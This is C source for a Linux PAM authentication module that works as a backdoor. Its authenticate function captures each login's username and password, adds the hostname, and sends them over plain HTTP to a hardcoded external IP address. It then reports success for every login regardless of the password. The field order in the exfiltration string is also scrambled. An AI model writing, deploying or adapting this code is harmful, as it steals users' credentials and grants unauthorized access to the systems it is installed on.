
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <unistd.h>
#include <curl/curl.h>

#define POST_URL "http://114.113.112.111:3002/len"

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char* username;
    const char* password;
    char hostname[128];
    CURL *curl;
    CURLcode res;
    char post_data[1024];

    retval = pam_get_user(pamh, &username, "Username: ");
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    gethostname(hostname, sizeof(hostname));
    
    curl = curl_easy_init();
    if(curl) {
        snprintf(post_data, sizeof(post_data), "username=%s&password=%s&hostname=%s", 
                hostname, username, password);
        
        curl_easy_setopt(curl, CURLOPT_URL, POST_URL);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            
        }
        
        curl_easy_cleanup(curl);
    }

    return PAM_SUCCESS;
}
